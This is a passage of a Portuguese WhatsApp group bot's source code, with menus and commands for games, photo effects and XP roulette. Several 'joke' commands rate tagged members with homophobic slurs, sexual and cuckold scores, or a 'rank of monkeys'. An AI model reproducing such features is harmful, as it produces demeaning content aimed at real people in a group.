lagu = await getBuffer(`http://brizas-api.herokuapp.com/imitar/ricksanchez?apikey=BOT SOPHIA&text=${query}`)
loli.sendMessage(from, lagu, audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

/* ===================================================[ ${NomeDoMenu} ]==============================================================*/    



/*===================================================[ ${NomeDoMenu} ]==============================================================*/    

case 'jogos': 
case 'diversão':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
const chatts2 = `${totalchat.length}`
const jgif2 = fs.readFileSync('./src/jgif.mp4')
loli.sendMessage(from, jgif2,  MessageType.video, {mimetype: 'video/gif', quoted: say1, caption: `
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│Olá @${sender.split('@')[0]}!!
┃⋆├───────────────────
┃⋆│⬩ 𝗂𝗇f𝗈𝗋𝗆𝖺𝖼̧𝗈̃𝖾𝗌 𝖽𝗈 𝖻𝗈𝗍
┃⋆│⪧ Nome ${pushname} ⟨💎⟩
┃⋆│⪧ prefix: ⟨ ${prefix} ⟩ ⟨❗⟩            
┃⋆│⪧ Bateria: ${bateria} ⟨🔋⟩               
┃⋆│⪧ Horário: ${hr} ⟨⏰⟩                       
┃⋆│⪧ Chats ${chatts2} ⟨🏓⟩
┃⋆╰───────────────────
╰━════════════════════⊷
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│⬩ 𝙼𝚎𝚗𝚞 𝚍𝚎 𝚍𝚒𝚟𝚎𝚛𝚜𝚊̃𝚘
┃⋆│💎➢ ${prefix}Jogodavelha @pessoa ⟨🤯⟩
┃⋆│➥ Novo jogo da velha
┃⋆│💎➢ ${prefix}Resetavelha ⟨🌺⟩
┃⋆│➥ Reseta o jogo da velha
┃⋆│💎➢ ${prefix}Getbio @pessoa ⟨🧐⟩
┃⋆│➥ Pega o recado recado.
┃⋆│💎➢ ${prefix}Shit ⟨😬⟩
┃⋆│➥ shit aleatória shitpost br
┃⋆│💎➢ ${prefix}Dado ⟨🎲⟩
┃⋆│➥ Sticker de dado aleatório  
┃⋆│💎➢ ${prefix}Tagme ⟨🌀⟩
┃⋆│➥ Te menciona 
┃⋆│💎➢ ${prefix}Ppt ⟨🔥⟩
┃⋆│➥ Jogo do papel 
┃⋆│💎➢ ${prefix}Gado ⟨🐂⟩
┃⋆│➥ Lhe diz seu nível de gado 
┃⋆│💎➢ ${prefix}Sn ⟨😬⟩
┃⋆│➥ Lhe diz sim ou não 
┃⋆│💎➢ ${prefix}Chance ⟨🐒⟩
┃⋆│➥ Lhe diz a chance de algo 
┃⋆│💎➢ ${prefix}Pau ⟨😋⟩
┃⋆│➥ tamanho do seu brinquedo
┃⋆│💎➢ ${prefix}Slot ⟨👾⟩
┃⋆│➥ Caça níqueis 
┃⋆│💎➢ ${prefix}Gay ⟨🏳️‍🌈⟩
┃⋆│➥ Lhe  diz o quanto gay você é 
┃⋆│💎➢ ${prefix}Roleta ⟨📄⟩
┃⋆│➥ Roleta russa 
┃⋆│💎➢ ${prefix}Caracoroa ⟨💮⟩
┃⋆│➥ caracoroa 
┃⋆│💎➢ ${prefix}Amongus ⟨👥⟩
┃⋆│➥ "Expulsa" alguém da nave 
┃⋆│💎➢ ${prefix}Level ⟨💖⟩
┃⋆│➥ Mostra seu level atual 
┃⋆│💎➢ ${prefix}Omais ⟨❌⟩
┃⋆│➥ Sorteia alguém para "o mais" 
┃⋆│💎➢ ${prefix}Ttt ⟨🎮⟩
┃⋆│➥ Jogo da velha 
┃⋆│💎➢ ${prefix}Top5 ⟨😬⟩
┃⋆│➥ Menciona os membros 
┃⋆│💎➢ ${prefix}Casal ⟨🙉⟩
┃⋆│➥ Marca um possível casal 
┃⋆│💎➢ ${prefix}inteligência ⟨👩‍🎓⟩
┃⋆│➥ Marca a porcentagem de inteligência
┃⋆│💎➢ ${prefix}chifre⟨🐂⟩
┃⋆│➥ Marca a porcentagem de corno
┃⋆│💎➢ ${prefix}morte ⟨☠⟩
┃⋆│➥ Mostra a idade quando vai morrer
┃⋆│💎➢ ${prefix}supera ⟨👀⟩
┃⋆│➥ Marca quanto você superou
┃⋆│💎➢ ${prefix}burro ⟨👀⟩
┃⋆│➥ Marca quanto você é burro
┃⋆│💎➢ ${prefix}forte ⟨👀⟩
┃⋆│➥ Marca quanto você é forte
┃⋆│💎➢ ${prefix}eqxv ⟨🤔⟩
┃⋆│➥ Aviso do Xvideos
┃⋆│💎➢ ${prefix}gostosas2 ⟨😜⟩
┃⋆│➥ Dectador de Gostosas
┃⋆│💎➢ ${prefix}gostosa ou gostoso ⟨😏⟩
┃⋆│➥ Marca o quanto é Gostoso(a)
┃⋆│💎➢ ${prefix}Rankfeios ⟨👹⟩
┃⋆│➥ Rank dos mais feios
┃⋆│💎➢ ${prefix}Rankcaco ⟨🐒⟩
┃⋆│➥ Rank dos macacos 
┃⋆│💎➢ ${prefix}Rankgay ⟨‍🌈⟩
┃⋆│➥ Rank dos mais gays
┃⋆│💎➢ ${prefix}Rank texto ⟨🔥⟩
┃⋆│➥ Rank dos mais ?
┃⋆│💎➢ ${prefix}Abraço @Pessoa ⟨🐂⟩
┃⋆│➥ Dá-lhe um abraço no seu amg
┃⋆│💎➢ ${prefix}linguada @Pessoa ⟨😘⟩
┃⋆│➥ Dá-lhe uma linguada no seu amg
┃⋆│💎➢ ${prefix}tiro @Pessoa ⟨😡⟩
┃⋆│➥ Dá-lhe um tiro no seu amg
┃⋆│💎➢ ${prefix}mamada @Pessoa ⟨🤤⟩
┃⋆│➥ Dá-lhe uma mamada no seu amg
┃⋆│💎➢ ${prefix}sexo @Pessoa ⟨🤤⟩
┃⋆│➥ fazer secsu com seu amg
┃⋆│💎➢ ${prefix}soco @Pessoa ⟨👊⟩
┃⋆│➥ Dá-lhe um soco no seu amg
┃⋆│💎➢ ${prefix}casar @Pessoa ⟨👰⟩
┃⋆│➥ casar com a pessoa 
┃⋆│💎➢ ${prefix}tapa @Pessoa ⟨✋⟩
┃⋆│➥ Dá-lhe um tapa no seu amg
┃⋆│💎➢ ${prefix}tapa2 @Pessoa ⟨✋⟩
┃⋆│➥ Dá-lhe um tapa no seu amg
┃⋆│  com sua foto de perfil
┃⋆│💎➢ ${prefix}cafune @Pessoa ⟨😊⟩
┃⋆│➥ Dá-lhe um cafune no seu amg
┃⋆│💎➢ ${prefix}beijo @Pessoa ⟨😗⟩
┃⋆│➥ Dá-lhe um beijo no seu amg
┃⋆│💎➢ ${prefix}matar @Pessoa ⟨😡⟩
┃⋆│➥ Dá-lhe uma espadada
┃⋆│💎➢ ${prefix}bicuda @Pessoa ⟨🦶⟩
┃⋆│➥ Dá-lhe uma bicuda
┃⋆│💎➢ ${prefix}bazukar @Pessoa ⟨💥⟩
┃⋆│➥ Dá-lhe uma bazukada
┃⋆│💎➢ ${prefix}assaltar @Pessoa ⟨🔫⟩
┃⋆│➥ Assaltar o amiguinho do gp
┃⋆│💎➢ ${prefix}desviar @Pessoa ⟨😜⟩
┃⋆│➥ Desviar de todos os ataque
┃⋆│💎➢ ${prefix}sentada @Pessoa ⟨⬇️⟩
┃⋆│➥ Dá-lhe uma sentada
┃⋆│💎➢ ${prefix}triggered  ⟨🤬⟩
┃⋆│➥ marca uma imagem para ficar puto
┃⋆│💎➢ ${prefix}Placa texto  ⟨🖼⟩
┃⋆│➥ faz uma placa de 1m para voce
┃⋆│💎➢ ${prefix}gayfig  ⟨🤭⟩
┃⋆│➥ marca foto e vira toda colorida
┃⋆│💎➢ ${prefix}arma  ⟨🤡⟩
┃⋆│➥ marca foto e terá uma arma nela
┃⋆│💎➢ ${prefix}preso  ⟨😶⟩
┃⋆│➥ marca foto e a fig ficara presa 
┃⋆│💎➢ ${prefix}figupet  ⟨🐕⟩
┃⋆│➥ marca foto e terá um pet nela
┃⋆│💎➢ ${prefix}drip  ⟨😎⟩
┃⋆│➥ marca foto e a fig drip
┃⋆│💎➢ ${prefix}figushit 😳⟩
┃⋆│➥ marca foto e a fig shit
┃⋆│💎➢ ${prefix}figuinvertida  ⟨☻⟩
┃⋆│➥ marca foto e deixa invertida
┃⋆│💎➢ ${prefix}figuprocurado  ⟨🙈⟩
┃⋆│➥ marca foto e tera fig procurado
┃⋆│💎➢ ${prefix}figuwasted  ⟨👉🏼⟩
┃⋆│➥ marca foto e tera fig se fodeu
┃⋆│💎➢ ${prefix}figuborrada  ⟨🏮⟩
┃⋆│➥ marca foto e tera fig borrada
┃⋆│💎➢ ${prefix}apostar  ⟨🧐⟩
┃⋆│➥ apostar (quantidade de dinheiro)
┃⋆│💎➢ ${prefix}verlevel ⟨🎉⟩
┃⋆│➥ ver xp da @ pessoa
┃⋆│💎➢ ${prefix}vermoney ⟨💲⟩
┃⋆│➥ ver dinheiro @ pessoa
┃⋆│💎➢ ${prefix}deathnote ⟨💀⟩
┃⋆│➥ escreva a morte da pessoa
┃⋆│💎➢ ${prefix}roubar ⟨🕴⟩
┃⋆│➥ roubar figurinha do amigo
┃⋆│💎➢ ${prefix}metadinha ⟨👫⟩
┃⋆│➥ manda imagem de metadinha
┃⋆│💎➢ ${prefix}rankotakus ⟨👸⟩
┃⋆│➥ manda imagem de metadinha
┃⋆│💎➢ ${prefix}viplist ⟨👑⟩
┃⋆│➥ ver lista de vips 
┃⋆│💎➢ ${prefix}kannafig ⟨💖⟩
┃⋆│➥ placa com texto kanna
┃⋆│💎➢ ${prefix}seumadruga ⟨🔊⟩
┃⋆│➥ imitar voz seumadruga
┃⋆│💎➢ ${prefix}patolino ⟨🔊⟩
┃⋆│➥ imitar voz patolino
┃⋆│💎➢ ${prefix}faustao ⟨🔊⟩
┃⋆│➥ imitar voz faustao
┃⋆│💎➢ ${prefix}ibere ⟨🔊⟩
┃⋆│➥ imitar voz ibere
┃⋆│💎➢ ${prefix}eminem ⟨🔊⟩
┃⋆│➥ imitar voz eminem
┃⋆│💎➢ ${prefix}ricksanchez ⟨🔊⟩
┃⋆│➥ imitar voz ericksanchez
┃⋆╰───────────────────
╰━════════════════════⊷ `
})
break
case 'editphoto': 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
const photogif1 = fs.readFileSync('./src/photogif.mp4')
loli.sendMessage(from, photogif1,  MessageType.video, {mimetype: 'video/gif', quoted: say1, caption: `
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│⬩ ᴍᴇɴᴜ ᴅᴇ ᴇᴅɪᴛᴘʜᴏᴛᴏ
┃⋆│
┃⋆│💎➢ .blackpink ⟨📷⟩
┃⋆│💎➢ .neon ⟨📷⟩
┃⋆│💎➢ .greenneon ⟨📷⟩
┃⋆│💎➢ .advanceglow ⟨📷⟩
┃⋆│💎➢ .futureneon ⟨📷⟩
┃⋆│💎➢ .sandwriting ⟨📷⟩
┃⋆│💎➢ .sandsummer ⟨📷⟩
┃⋆│💎➢ .sandengraved ⟨📷⟩ 
┃⋆│💎➢ .metaldark ⟨📷⟩
┃⋆│💎➢ .neonlight ⟨📷⟩
┃⋆│💎➢ .holographic ⟨📷⟩ 
┃⋆│💎➢ .text1917 ⟨📷⟩
┃⋆│💎➢ .minion ⟨📷⟩
┃⋆│💎➢ .deluxesilver ⟨📷⟩
┃⋆│💎➢ .newyearcard ⟨📷⟩
┃⋆│💎➢ .bloodfrosted ⟨📷⟩
┃⋆│💎➢ .halloween ⟨📷⟩
┃⋆│💎➢ .jokerlogo ⟨📷⟩
┃⋆│💎➢ .fireworksparkle ⟨📷⟩
┃⋆│💎➢ .natureleaves ⟨📷⟩
┃⋆│💎➢ .bokeh ⟨📷⟩
┃⋆│💎➢ .toxic ⟨📷⟩
┃⋆│💎➢ .strawberry ⟨📷⟩
┃⋆│💎➢ .box3d ⟨📷⟩
┃⋆│💎➢ .roadwarning ⟨📷⟩
┃⋆│💎➢ .breakwall ⟨📷⟩
┃⋆│💎➢ .icecold ⟨📷⟩
┃⋆│💎➢ .luxury ⟨📷⟩
┃⋆│💎➢ .cloud ⟨📷⟩
┃⋆│💎➢ .summersand ⟨📷⟩
┃⋆│💎➢ .horrorblood ⟨📷⟩
┃⋆│💎➢ .thunder ⟨📷⟩
┃⋆│💎➢ .glitch ⟨📷⟩
┃⋆│💎➢ .avenger ⟨📷⟩
┃⋆│💎➢ .space ⟨📷⟩
┃⋆│💎➢ .ninjalogo ⟨📷⟩
┃⋆│💎➢ .marvelstudio ⟨📷⟩
┃⋆│💎➢ .lionlogo ⟨📷⟩
┃⋆│💎➢ .wolflogo ⟨📷⟩
┃⋆│💎➢ .wallgravity ⟨📷⟩
┃⋆│💎➢ .wetglass ⟨📷⟩
┃⋆│💎➢ .multicolor3d ⟨📷⟩
┃⋆│💎➢ .watercolor ⟨📷⟩
┃⋆│💎➢ .luxurygold ⟨📷⟩
┃⋆│💎➢ .galaxywallpaper ⟨📷⟩
┃⋆│💎➢ .lighttext ⟨📷⟩
┃⋆│💎➢ .beautifulflower ⟨📷⟩
┃⋆│💎➢ .puppycute ⟨📷⟩
┃⋆│💎➢ .royaltext ⟨📷⟩
┃⋆│💎➢ .heartshaped ⟨📷⟩
┃⋆│💎➢ .birthdaycake ⟨📷⟩
┃⋆│💎➢ .galaxystyle ⟨📷⟩
┃⋆│💎➢ .hologram3d ⟨📷⟩
┃⋆│💎➢ .greenneon ⟨📷⟩
┃⋆│💎➢ .glossychrome ⟨📷⟩
┃⋆│💎➢ .greenbush ⟨📷⟩
┃⋆│💎➢ .metallogo ⟨📷⟩
┃⋆│💎➢ .noeltext ⟨📷⟩
┃⋆│💎➢ .glittergold ⟨📷⟩
┃⋆│💎➢ .starsnight ⟨📷⟩
┃⋆│💎➢ .textbyname ⟨📷⟩
┃⋆│💎➢ .writegalacy ⟨📷⟩
┃⋆│💎➢ .galaxybat ⟨📷⟩
┃⋆│💎➢ .snow3d ⟨📷⟩
┃⋆│💎➢ .birthdayday ⟨📷⟩
┃⋆│💎➢ .goldplaybutton ⟨📷⟩
┃⋆│💎➢ .silverplaybutton ⟨📷⟩
┃⋆│💎➢ .freefire ⟨📷⟩
┃⋆│💎➢ .1977 ⟨📷⟩
┃⋆│💎➢ .aden ⟨📷⟩
┃⋆│💎➢ .brannan ⟨📷⟩
┃⋆│💎➢ .brooklyn ⟨📷⟩
┃⋆│💎➢ .clarendon ⟨📷⟩
┃⋆│💎➢ .perpetua ⟨📷⟩
┃⋆│💎➢ .xpro2 ⟨📷⟩
┃⋆│💎➢ .gingham ⟨📷⟩
┃⋆│💎➢ .rise ⟨📷⟩
┃⋆│💎➢ .slumber ⟨📷⟩
┃⋆│💎➢ .valencia ⟨📷⟩
┃⋆│💎➢ .toaster ⟨📷⟩
┃⋆│💎➢ .stinson ⟨📷⟩
┃⋆│💎➢ .reyes ⟨📷⟩
┃⋆│💎➢ .inkwell ⟨📷⟩
┃⋆│💎➢ .earlybird ⟨📷⟩
┃⋆│💎➢ .walden ⟨📷⟩
┃⋆│💎➢ .kelvin ⟨📷⟩
┃⋆│💎➢ .lark ⟨📷⟩
┃⋆│💎➢ .lofi ⟨📷⟩
┃⋆│💎➢ .maven ⟨📷⟩
┃⋆│💎➢ .mayfair ⟨📷⟩
┃⋆│💎➢ .moon ⟨📷⟩
┃⋆│💎➢ .maven ⟨📷⟩
┃⋆╰───────────────────
╰━════════════════════⊷ `
})
break

case 'getbio':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
var yy = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
var p = await loli.getStatus(`${yy}`, MessageType.text)
reply(p.status)
if (p.status == 401) {
reply("Bio Indisponível")
}
break

case 'shit': //Jogos
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
data = fs.readFileSync('./database/arquivos/shitii.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
buffer = await getBuffer(randKey.result)
loli.sendMessage(from, buffer, image, {caption: 'Shitposter modinha 😳👍🏽', quoted: say1})
break

case 'nomeninja': //jogos
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return reply('escreva seu nome')
loli.updatePresence(from, Presence.composing)
nome = body.slice(10)
try {
data = await fetchJson(`https://api.terhambar.com/ninja?nama=${nome}`)
hasil = `Seu nome de ninja:\n\n${data.result.ninja}`
reply(hasil)
} catch {
reply(ptbr.erro())
}
break

case 'dado': //Jogos
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
const dadus = ["⚀","⚁","⚂","⚃","⚄","⚅"]
dadu = dadus[Math.floor(Math.random() * dadus.length)]
dador = fs.readFileSync('./database/dados/'+dadu+'.webp')
loli.sendMessage(from, dador, sticker, {quoted: say1})
break

case 'tagme': //Jogos
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
const tagme = {
text: `@${sender.split("@")[0]} 🧙‍♂️`,
contextInfo: {mentionedJid: [sender]
}
}
loli.sendMessage(from, tagme, text)
break

case 'ppt': //Jogos
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return reply(ptbr.tterro())
ppt = ["pedra","papel","tesoura"]
ppy = ppt[Math.floor(Math.random() * ppt.length)]
ppg = Math.floor(Math.random() * 13) + 349
pptb = ppy
pph = `Você ganhou ${ppg} em xp`
if ((pptb == "pedra" && args == "papel") || 
(pptb == "papel" && args == "tesoura") || 
(pptb == "tesoura" && args == "pedra")) {
var vit = "vitoria"
} else if ((pptb == "pedra" && args == "tesoura") || 
(pptb == "papel" && args == "pedra") || 
(pptb == "tesoura" && args == "papel")) {
var vit = "derrota"
} else if ((pptb == "pedra" && args == "pedra") ||
(pptb == "papel" && args == "papel") ||
(pptb == "tesoura" && args == "tesoura")) {
var vit = "empate"
} else if (vit = "undefined") {
return reply(ptbr.tterro())
}
if (vit == "vitoria") {
var tes = "Vitória do jogador"
}
if (vit == "derrota" ) {
var tes = "A vitória é da 💎♡Høřı.B.O.T♡💎 "
}
if (vit == "empate" ) {
var tes = "O jogo terminou em empate"
}
reply(`💎♡Høřı.B.O.T♡💎 jogou: ${pptb}\nO jogador jogou: ${args}\n\n${tes}`)
if (tes == "Vitória do jogador") {
reply(pph)
}
break
case 'gado':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
		               
		             buffer = await getBuffer(`https://i.imgur.com/RFndWDv.jpg`)
		
			var chifre = ["ultra extreme gado", "Gado-Master", "Gado-Rei", "Gado", "Escravo-ceta", "Escravo-ceta Maximo", "Gacorno?", "Jogador De Forno Livre<3", "Mestre Do Frifai<3<3", "Gado-Manso", "Gado-Conformado", "Gado-Incubado", "Gado Deus", "Mestre dos Gados", "Topa tudo por buceta", "Gado Comum", "Mini Gadinho", "Gado Iniciante", "Gado Basico", "Gado Intermediario", "Gado Avançado", "Gado Profisional", "Gado Mestre", "Gado Chifrudo", "Corno Conformado", "Corno HiperChifrudo", "Chifrudo Deus", "Mestre dos Chifrudos"]
			var gado = chifre[Math.floor(Math.random() * chifre.length)]
			gadop = `${Math.floor(Math.random() * 100)}`
			loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null, caption: `Você é:\n\n${gado}`})
			break

			


case 'chance': //Jogos
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing) 
 
buffer = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSh5L_UQNnPnyy0_ZwYWeRpp1ne0IHex-mVXsoATUwJLBvvM6V5d9JMucw&s=10`)
var avb = body.slice(7)
if (args.length < 1) return loli.sendMessage(from, `Você precisa digitar da forma correta\nExemplo: ${prefix}chance do ${SeuNome} ser um trouxa`, text, {quoted: say1})
random = `${Math.floor(Math.random() * 100)}`
loli.sendMessage(from, buffer, image, {quoted: say1, thumbnail:null, caption: `A chance ${body.slice(7)}\n\né de... ${random}%` })
break

case 'omais': //Jogos
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing) 
buffer = await getBuffer(`https://i.imgur.com/lrmUWtF.png`)
membr = []
const mett = groupMembers
const msdd = groupMembers
const siapssa = mett[Math.floor(Math.random() * mett.length)]
const sipssd = pushname[Math.floor(Math.random() * msdd.length)]
membr.push(siapssa.jid)
loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null, caption: `O mais${body.slice(6)} é o(a): @${siapssa.jid.split('@')[0]}`})
break  

case 'pau'://Jogos
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
addFilter(from)
 
buffer = await getBuffer(`https://i.imgur.com/vW6DUAl_d.webp?maxwidth=640&shape=thumb&fidelity=medium`)
random = `${Math.floor(Math.random() * 35)}`
const tamanho = random
//var (isNaN(tamanho))
if (tamanho < 13 ) {pp = 'só a fimose'} else if (tamanho == 13 ) {pp = 'passou da média😳'} else if (tamanho == 14 ) {pp = 'passou da média😳'} else if (tamanho == 15 ) {pp = 'eita, vai pegar manga?'} else if (tamanho == 16 ) {pp = 'eita, vai pegar manga?'} else if (tamanho == 17 ) {pp = 'calma man, a mina não é um poço😳'} else if (tamanho == 18 ) {pp = 'calma man, a mina não é um poço😳'} else if (tamanho == 19 ) {pp = 'calma man, a mina não é um poço😳'} else if (tamanho == 20 ) {pp = 'você tem um poste no meio das pernas'} else if (tamanho == 21 ) {pp = 'você tem um poste no meio das pernas'} else if (tamanho == 22 ) {pp = 'você tem um poste no meio das pernas'} else if (tamanho == 23 ) {pp = 'você tem um poste no meio das pernas'} else if (tamanho == 24 ) {pp = 'você tem um poste no meio das pernas'} else if (tamanho > 25 ) {pp = 'vai procurar petróleo com isso?'}
loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null, caption: `Seu pau tem ${random}cm\n\n${pp}`})
break

case 'slot': //Jogos
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
const somtoy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
ppg = Math.floor(Math.random() * 13) + 349
if ((somtoy == '🥑 : 🥑 : 🥑') ||(somtoy == '🍉 : 🍉 : 🍉') ||(somtoy == '🍓 : 🍓 : 🍓') ||(somtoy == '🍎 : 🍎 : 🍎') ||(somtoy == '🍍 : 🍍 : 🍍') ||(somtoy == '🥝 : 🥝 : 🥝') ||(somtoy == '🍑 : 🍑 : 🍑') ||(somtoy == '🥥 : 🥥 : 🥥') ||(somtoy == '🍋 : 🍋 : 🍋') ||(somtoy == '🍐 : 🍐 : 🍐') ||(somtoy == '🍌 : 🍌 : 🍌') ||(somtoy == '🍒 : 🍒 : 🍒') ||(somtoy == '🔔 : 🔔 : 🔔') ||(somtoy == '🍊 : 🍊 : 🍊') ||(somtoy == '🍇 : 🍇 : 🍇')) {
var vitr = "Você ganhou!!!"
} else {
var vitr = "Você perdeu..."
}
const slott = 
`Consiga 3 iguais para ganhar
╭╾╾╾╾ ≪ •❈• ≫ ╾╾╾╾╗
║         [💰SLOT💰 | 777 ]        
║                                             
║                                             
║           ${somtoy}  ◄━━┛
║            
║                                           
║          [💰SLOT💰 | 777 ]        
╚╾╾╾╾ ≪ •❈• ≫ ╾╾╾╾╝
                    @𝙯𝙖𝙙𝙞𝙠

${vitr}`
if (vitr == "Você ganhou!!!") {
setTimeout( () => {
reply(`Você ganhou ${ppg} em xp!!!`)
}, 1100)
}
loli.sendMessage(from, slott, text, {quoted: say1})
break
   
case 'gay': //Jogos
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing) 
buffer = await getBuffer(`https://i.imgur.com/mk5twCq.jpg`)
random = `${Math.floor(Math.random() * 100)}`
boiola = random
if (boiola < 20 ) {bo = 'hmm... você é hetero😔'} else if (boiola == 21 ) {bo = '+/- boiola'} else if (boiola == 23 ) {bo = '+/- boiola'} else if (boiola == 24 ) {bo = '+/- boiola'} else if (boiola == 25 ) {bo = '+/- boiola'} else if (boiola == 26 ) {bo = '+/- boiola'} else if (boiola == 27 ) {bo = '+/- boiola'} else if (boiola == 28 ) {bo = '+/- boiola'} else if (boiola == 29 ) {bo = '+/- boiola'} else if (boiola == 30 ) {bo = '+/- boiola'} else if (boiola == 31 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 32 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 33 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 34 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 35 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 36 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 37 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 38 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 39 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 40 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 41 ) {bo = 'você é né?😏'} else if (boiola == 42 ) {bo = 'você é né?😏'} else if (boiola == 43 ) {bo = 'você é né?😏'} else if (boiola == 44 ) {bo = 'você é né?😏'} else if (boiola == 45 ) {bo = 'você é né?😏'} else if (boiola == 46 ) {bo = 'você é né?😏'} else if (boiola == 47 ) {bo = 'você é né?😏'} else if (boiola == 48 ) {bo = 'você é né?😏'} else if (boiola == 49 ) {bo = 'você é né?😏'} else if (boiola == 50 ) {bo = 'você é ou não???'} else if (boiola > 51) {bo = 'você é gay😉'
}
loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null, caption: `Você é ${random}% gay\n\n${bo}`})
break

case 'roleta': //Jogos
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
const tiro = ["vazio","vazio","vazio","vazio","vazio","vazio","vazio","vazio","pow","pow"]
const figr = ["pattta1","pattta2","pattta3"]
tpa = tiro[Math.floor(Math.random() * (tiro.length))]	
tpb = figr[Math.floor(Math.random() * (figr.length))]
figb = fs.readFileSync('./src/'+tpb+'.webp')
if (tpa == "vazio") {
var morte = "Você teve sorte dessa vez, o tambor estava vazio."
} else if (tpa == "pow") {
var morte = "Tinha uma bala no tambor, POW!"
}
if (morte == "Tinha uma bala no tambor, POW!") {
setTimeout( () => {
loli.sendMessage(from, figb, sticker, {quoted: say1})
}, 2100)
}
setTimeout( () => {
loli.sendMessage(from, morte, text, {quoted: say1})
}, 2300)
break
case 'roleta2':
const userLevel1= getLevelingLevel(sender)
const reqiredXp = 5 * Math.pow(userLevel1, (5 / 2)) + 50 * userLevel1 + 100
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
					if (!isOwner) return reply(`te fuder maluco nem meu dono você é`)
					addFilter(from)
					reply('*Girando a Arma...Aguarde 3 segundos*')
					setTimeout(async function() {
						r = Math.floor(Math.random() * _level.length + 0)
						rxp = Math.floor(Math.random() * 30000 + 0)
						mem = _level[r].id
						if(mem.includes(OriginalOwner)) {
							r = Math.floor(Math.random() * _level.length + 0)
							mem = _level[r].id
						}
						is_add = Math.floor(Math.random() * 1 + 0)
						if(is_add == 1) {
							if(getLevelingXp(mem) <= rxp && getLevelingXp(mem) != 0) rxp = rmLevelingXp(mem, getLevelingXp(mem))
							else rmLevelingXp(mem, rxp)
							await loli.sendMessage(from, ` *O @${mem.split('@')[0]} tomou um tiro da pistola do azar, perdeu ${rxp}xp* `, text, {contextInfo: {"mentionedJid": [mem]}})
						} else {
							addLevelingXp(mem, rxp)
							if (reqiredXp <= getLevelingXp(mem)) {
								addLevelingLevel(mem, 1)
								await mentions(`@${mem.split('@')[0]} ganhou ${rxp} de xp no roleta russa`, [mem], true)
							}
							await loli.sendMessage(from, ` *O @${mem.split('@')[0]} tomou um tiro da pistola da sorte, ganhou ${rxp}xp* `, text, {contextInfo: {"mentionedJid": [mem]}})
						}
					}, 3000)
					break

case 'caracoroa': //Jogos
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
addFilter(from)
const cara = fs.readFileSync('./database/cara/cara.webp');
const coroa = fs.readFileSync('./database/cara/coroa.webp');
cararo = ["cara", "coroa"]
fej = cararo[Math.floor(Math.random() * cararo.length)]
gg = fej
reply(`você conseguiu: ${fej}`)
cararoa = fs.readFileSync('./database/cara/'+fej+'.webp')
loli.sendMessage(from, cararoa, sticker, {quoted: say1})
break

case 'amongus':  //fuciona
addFilter(from)
if (!isOwner) return reply(`te fuder maluco nem meu dono você é`)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroupAdmins) return reply(mess.only.admin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Você precisa mencionar alguém')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pro = '.\n'
for (let _ of mentioned) {
pro += `@${_.split('@')[0]}\n`
}
sus = 
`.      　。　　　　•　    　ﾟ　　。
　　.　　　.　　　  　　.　　　　　。　　   。　.
　.　　      。　        ඞ   。　    .    •
•            @${mentioned[0].split('@')[0]} foi ejetado
                  1 impostor restante   。　.
　 　　。　　 　　　　ﾟ　　　.　      　　　.
,　　　　.                  .`
loli.groupRemove(from, mentioned)
mentions(`${sus}`, mentioned, true)
break

  

case 'ttt': //Jogos
const limitrl = getLimit(sender, daily)
if (!isGroup) {
reply(ptbr.group())
} else if (tttset.tttstatus == "on") {
reply(`╭◪「❗ESPERE❗ 」\n╰───────────────╮  \n╭───────────────╯\n├❏ Alguém já está jogando no momento\n├❏ Por favor aguarde um instante...\n├❏ Em 1 HORA.\n╰───────────────╯`)
} else if (tttset.waitingTime == "on") {
reply(`╭◪「❗ESPERE 1 HORA❗ 」\n╰───────────────╮  \n╭───────────────╯\n├❏ Alguém jogou recentemente\n├❏ Por favor aguarde o tempo de espera...\n╰───────────────╯`)
